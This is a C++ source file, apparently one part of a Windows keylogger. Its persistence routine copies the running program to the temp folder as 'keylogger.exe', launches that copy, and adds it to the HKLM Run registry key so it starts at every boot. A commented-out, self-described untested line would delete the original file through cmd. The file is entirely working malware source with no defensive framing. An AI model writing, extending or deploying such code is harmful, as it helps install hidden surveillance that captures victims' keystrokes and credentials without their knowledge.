#include "start.h"
#include <Windows.h>
#include <string>
#include <iostream>

bool PersistantApplication() {
	char tempPath[MAX_PATH];
	GetTempPathA(MAX_PATH, tempPath);

 	char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, sizeof(exePath));
	
	std::string tempDir(tempPath);
	std::string exeDir(exePath);

	if(exeDir.substr(0, tempDir.length()) == tempDir) {
		HKEY key;
		long regeditOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE|KEY_READ, &key);
		if(regeditOpen == ERROR_SUCCESS) {
			RegSetValueExA(key, "Keylogger", 0, REG_SZ, (BYTE*)exePath, sizeof(exePath));
			RegCloseKey(key);
		}
	} else {
		STARTUPINFOA si{sizeof(si)};
		PROCESS_INFORMATION pi{};
		//system(("cmd /c ping localhost -n 2 & del /f /q "+exeDir).c_str());
		// Note for me [!] : I  didn't test this code line because of my compiler (g++) won't start cmd.exe :( but it should work
		CopyFileExA(exePath, (tempDir + "keylogger.exe").c_str(), NULL, NULL, FALSE, 0);
		CreateProcessA((tempDir + "keylogger.exe").c_str(), NULL, NULL, NULL, FALSE, 0, NULL, (tempDir.c_str()), &si, &pi);
		exit(0);
	}
return false;
}
